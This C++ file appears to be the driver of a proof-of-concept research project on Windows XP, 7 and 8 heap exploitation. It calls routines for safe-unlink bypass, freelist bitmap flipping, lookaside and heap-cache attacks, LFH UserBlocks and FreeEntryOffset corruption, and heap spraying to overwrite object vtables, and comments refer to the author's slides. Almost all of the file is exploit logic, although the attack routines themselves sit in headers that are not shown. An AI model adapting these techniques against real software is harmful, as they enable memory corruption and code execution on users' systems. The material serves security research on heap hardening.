// HeapsAboutCorruption.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include "XPHeap.h"
#include "W7Heap.h"
#include "W8Heap.h"
#include "vtable.h"

#include "Debug.h"

int _tmain(int argc, _TCHAR* argv[])
{
#ifdef WIN8

	CW8Heap heap;

#elif WIN7

	CW7Heap heap;

#else

	CXPHeap heap;

#endif

	//heap.LFHTest();

	CTarget* target = new CTarget();
	CTarget* target_on_heap = NULL;

	//LFH freelist check boundary of resulted alloc mem, if from another than its heap, exploitation fail ...
	target_on_heap = (CTarget*)heap.Alloc(sizeof(target) / HEAP_MIN_PAGE_SIZE);
	if (NULL == target_on_heap)
		return 0;

	memcpy(target_on_heap, target, sizeof(target));

#if defined(WIN7) || defined(WIN8)
/*
/*/
	if (heap.FreelistFreeToOwnAttack(HEAP_FREELIST_WIN7X86_N))
	{
		HEAP_ENTRY* spray_entry = (HEAP_ENTRY*)SPRAY_ADDR;
		
		//We need to read this address, from our heapsprayed buffer!!
		LIST_ENTRY* leak_alloc = spray_entry->Links.Flink;

		//I. memory leak
		printf("owned allocation : %x vs %x\n", (ULONG_PTR)leak_alloc, (ULONG_PTR)(spray_entry + 1)->Links.Blink);

		for (int i = 0; i < 0x10; i++)
		{
			size_t size = HEAP_FREELIST_WIN7X86_N - (i / 4 ) * 0x10;
			void* big_chunk = heap.Alloc(size);
			ULONG code1 = ((HEAP_ENTRY*)((ULONG_PTR)big_chunk - offsetof(HEAP_ENTRY, Links)))->Code1;

			printf("%x (code1 : %x) size = %x\n", (ULONG_PTR)big_chunk, code1, size);

			//each alloc, leak_alloc chunk will be unlinked
			//we need to RW access to our heapsprayed buffer, to link this chunk back! :)

			//II. relink ==> heap manager return already used memory! -> not freed!!!
			spray_entry->Links.Flink = leak_alloc;
			(spray_entry + 1)->Links.Blink = leak_alloc;
		}
	}

/*/
#ifdef WIN32
	//x86 technique - mistake in my slides .. it is not fixed! .. just needs more tries to success :P 
	//but random succes -> maybe further investigation why ...
	if (heap.FreelistSearchToOwnHeapAttack(HEAP_FREELIST_WIN7X86_N))
	{
		void* big_chunk = heap.Alloc(HEAP_FREELIST_WIN7X86_N);
		ULONG code1 = ((HEAP_ENTRY*)((ULONG_PTR)big_chunk - offsetof(HEAP_ENTRY, Links)))->Code1;

		printf("HEAP ALLOC returner : %x (code1 : %x)\n", (ULONG_PTR)big_chunk, code1, ((HEAP_ENTRY*)((ULONG_PTR)big_chunk - offsetof(HEAP_ENTRY, Links)))->Links.Flink, ((HEAP_ENTRY*)((ULONG_PTR)big_chunk - offsetof(HEAP_ENTRY, Links)))->Links.Blink);
	}

	//printf("\r\n%x (%x) size = %x", (ULONG_PTR)big_chunk, *(ULONG_PTR*)((ULONG_PTR)big_chunk - sizeof(ULONG_PTR) * 2), HEAP_FREELIST_WIN7X86_N - (i / 4) * 0x10);
#endif
//*/
#ifdef WIN8
/*
/*
	srand ( (unsigned int)time((time_t)NULL) );
	BYTE n = (rand() % (0x6f)) + 0x10;//0x2D;//0x24;//0x24;//0x24;//

	CDebug::DbgPrint("\n\n\n\n****************\n\n\n");
	//for (int n = 0x10; n < 0x3f; n++)
	{
	printf(">try size : %x; and for !!!vtable at -> %p\n\n", n, target);
	
	//run this app more times!! for fullfill few conditions :
	//USERBLOCKS have to follow each other (more precisely second and third _HEAP_USERDATA_HEADER)
	//malloc for bitmap have to bu sucessfull
	if (heap.UserBlocksVTableAttack(n, target))
	{
		CAutoVtableRewrite<CW8Heap> rewrite(n, heap, false, -(int)offsetof(HEAP_ENTRY, Links));
		target->NoSafeHeap();
	}
	else
	{
		printf(" .. vtable too far!\n");
	}}
/*
	srand ( (unsigned int)time((time_t)NULL) );
	BYTE n = (rand() % (ARRAY_SIZE - 4)) + 3;

	printf("\ntry for %x\n", n);
	if (heap.UserBlocksAttackPoC(n))
	{
		void* mem_a = heap.Alloc(n);

		void* mem_b = heap.Alloc(n);

		memset(mem_a, 'A', n * HEAP_MIN_PAGE_SIZE);
		memset(mem_b, 'B', n * HEAP_MIN_PAGE_SIZE);

		printf("\nA (%x) : %s\n", mem_a, mem_a);
		printf("\nB (%x) : %s\n", mem_b, mem_b);
	}

//*/
#else(WIN7)
/*
/*/
#define REALIGN_ATTACK_SIZE	0x27
#define REALIGN_ATTACK_LOOP	0x3
	void* mem_a;
	if (heap.RealignFreeEntryAttack(REALIGN_ATTACK_SIZE, REALIGN_ATTACK_LOOP, &mem_a))
	{
		memset(mem_a, 'a', REALIGN_ATTACK_SIZE * HEAP_MIN_PAGE_SIZE);
		*((BYTE*)mem_a + REALIGN_ATTACK_SIZE * HEAP_MIN_PAGE_SIZE - 1) = 0;

		void* mem_b = heap.Alloc(REALIGN_ATTACK_SIZE);
		memset(mem_b, 'b', REALIGN_ATTACK_SIZE * HEAP_MIN_PAGE_SIZE);
		*((BYTE*)mem_b + REALIGN_ATTACK_SIZE * HEAP_MIN_PAGE_SIZE - 1) = 0;

		printf("\nmem_a = %s", mem_a);
		printf("\nmem_b = %s", mem_b);
	}

/*/
#define LFH_ENTRYOFFSET_SIZE	0x23
#define EMPTY_ALLOCS			10
	if (heap.FreeEntryOffsetAttack(LFH_ENTRYOFFSET_SIZE, EMPTY_ALLOCS))
	{
		void* mem_a = heap.Alloc(LFH_ENTRYOFFSET_SIZE);
		memset(mem_a, 'A', LFH_ENTRYOFFSET_SIZE * HEAP_MIN_PAGE_SIZE);
		*((BYTE*)mem_a + LFH_ENTRYOFFSET_SIZE * HEAP_MIN_PAGE_SIZE - 1) = 0;

		for (int i = 0; i < EMPTY_ALLOCS; i++)
		{
			void* mem = heap.Alloc(LFH_ENTRYOFFSET_SIZE);

			if (!mem)
				return -1;
			
			memset(mem, i, LFH_ENTRYOFFSET_SIZE * HEAP_MIN_PAGE_SIZE);
		}

		void* mem_b = heap.Alloc(LFH_ENTRYOFFSET_SIZE);
		memset(mem_b, 'B', LFH_ENTRYOFFSET_SIZE * HEAP_MIN_PAGE_SIZE);
		*((BYTE*)mem_b + LFH_ENTRYOFFSET_SIZE * HEAP_MIN_PAGE_SIZE - 1) = 0;

		printf("\nmem_a = %s", mem_a);
		printf("\nmem_b = %s", mem_b);
	}

//*/
#endif

#else

#ifdef LFH_EXAPLOITATION
	
	//SafeUnlink
	if (heap.SafeUnlinkAttack(4, target_on_heap))
	{
		CAutoVtableRewrite rewrite(4, heap);
		target_on_heap->NoSafeHeap();			
	}
	
	//bitmap flipping
	if (heap.FreelistBitmapFlipAttack(8, target_on_heap))
	{
		CAutoVtableRewrite rewrite(8, heap);
		target_on_heap->NoSafeHeap();
	}

	//Lookaside
	if (heap.LookasideAttack(20, target))
	{
		CAutoVtableRewrite rewrite(20, heap);
		target->NoSafeHeap();
	}

#else	
/*
/*
	if (xp_heap.HeapCachePointerAttack(0x156))
	{
		for (int i = 0; i < 0x4; i++)
			printf("\r\nnew alloc : %x", (ULONG_PTR)xp_heap.Alloc(0xFF));
	}
/*
	if (xp_heap.HeapCacheInsertAttack(0x223, 20, xp_heap.GetLookAsideList() + 20 + 1, target))
	{
		if (NULL != xp_heap.Alloc(20) && NULL != xp_heap.Alloc(20))// pop from lookaside!
		{
			CAutoVtableRewrite rewrite(20, xp_heap);
			target->NoSafeHeap();
		}
	}
/*
	if (xp_heap.HeapCacheInsertAttack(0x223, 20, target, target))
	{
		if (NULL != xp_heap.Alloc((0x223  & (~FREELIST0_DELTA)) - 1))
		{
			CAutoVtableRewrite rewrite((0x223  & (~FREELIST0_DELTA)) - 1, xp_heap, true);
			target->NoSafeHeap();
		}
	}
/*
	if (xp_heap.HeapCacheEntryFreelistAttack(HEAP_CASH_ENTRY_N, (void*)(SPRAY_ADDR + offsetof(FREELIST_CHUNK, Links))))
	{
		//building own Freelist[0][HEAP_CASH_ENTRY_N]
		FREELIST_CHUNK own_bchunk[0x13];
		for (int i = 0; i < _countof(own_bchunk); i++)
			CXPHeap::OverwriteChunkHeader(own_bchunk + i, HEAP_CASH_ENTRY_N + 1, SPRAY_NEXT_FLINK(i + 1), SPRAY_NEXT_FLINK(i));

		if (xp_heap.HeapSpray(0x100000 / HEAP_MIN_PAGE_SIZE, sizeof(own_bchunk), &own_bchunk, SPRAY_ADDR))
		{
			(void)xp_heap.Alloc(HEAP_CASH_ENTRY_N);//exploit it!

			//we own heap!!
			for (int i = 0; i < _countof(own_bchunk) + 0x20; i++)
				printf("\r\n>%x", (ULONG_PTR)xp_heap.Alloc(HEAP_CASH_ENTRY_N));
		}
	}
/*/
	//get targeted chunk from freelist[n] list == smaller (<0x80) allocation needed...
	byte ln = ((HEAP_CASH_ENTRY_N + 1 - 0x178) / sizeof(LIST_ENTRY)) + 1;
	if (heap.HeapCacheEntryFreelistAttack(HEAP_CASH_ENTRY_N, heap.GetFreeList() + ln))
	{	
		if (NULL == heap.Alloc(HEAP_CASH_ENTRY_N)) //drop first freelist[0][n] chunk!
			return 0;

		HEAP_ENTRY* bchunk = (HEAP_ENTRY*)heap.Alloc(HEAP_CASH_ENTRY_N); //drop second one -> get &freelist[ln]

		if (NULL != bchunk)
		{
			heap.EmptyLookAside(ln);
			CXPHeap::OverwriteChunkHeader(bchunk, HEAP_CASH_ENTRY_N, target_on_heap, target_on_heap);
			
			CAutoVtableRewrite rewrite(ln, heap);
			target_on_heap->NoSafeHeap();
		}
	}
/*/
	{

		void* safe = (void*)SPRAY_ADDR;
		void* own = (void*)(0x666);

		void* y[5] = { safe, safe, safe, safe, safe };	
		void* z[2] = { own, (void*)0x12345678 };

		ULONG_PTR* x = (ULONG_PTR*)y;
		if (xp_heap.FreelistRelinkAtack(0x123, 20, &x, sizeof(z), &z))
		{
			for (int i = 0; i < _countof(y); i++)
				printf("%x ", x[i]);
		}
	}
/*
	if (xp_heap.FreelistSearchAtack(0x25))
	{
		(void)xp_heap.Alloc(0x25);
		for (int i = 0; i < 10; i++)
			printf("\r\n>%x", (ULONG_PTR)xp_heap.Alloc(0x25));
	}
//*/
#endif	

#endif

//	delete target;
	heap.Free(target_on_heap);

	return 0;
}
